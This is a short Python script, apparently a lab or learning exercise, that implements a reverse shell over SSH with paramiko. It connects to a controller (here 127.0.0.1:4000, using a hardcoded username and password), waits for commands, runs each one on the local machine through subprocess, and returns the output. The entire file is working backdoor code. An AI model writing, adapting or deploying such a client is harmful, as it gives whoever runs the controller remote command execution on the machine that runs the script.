import paramiko
import shlex
import subprocess

def ssh_client(ip, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=username, password=password)

    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send("ClientConnected")  # Send an initial message or command
        while True:
            command = ssh_session.recv(1024).decode().strip()
            print("I have received command ",command)
            if not command:
                continue
            if command.lower() == 'exit':
                break
            try:
                # Execute command on the local system
                cmd_output = subprocess.check_output(shlex.split(command), stderr=subprocess.STDOUT)
                print("this isthe command output", cmd_output)
                ssh_session.send(cmd_output)
            except subprocess.CalledProcessError as e:
                ssh_session.send(f"Error: {e.output.decode()}")
            except Exception as e:
                ssh_session.send(f"Exception: {str(e)}")
    
    client.close()

if __name__ == "__main__":
    ip = '127.0.0.1'
    port = 4000
    username = 'lucid'
    password = '@iamlucid669'
    ssh_client(ip, port, username, password)
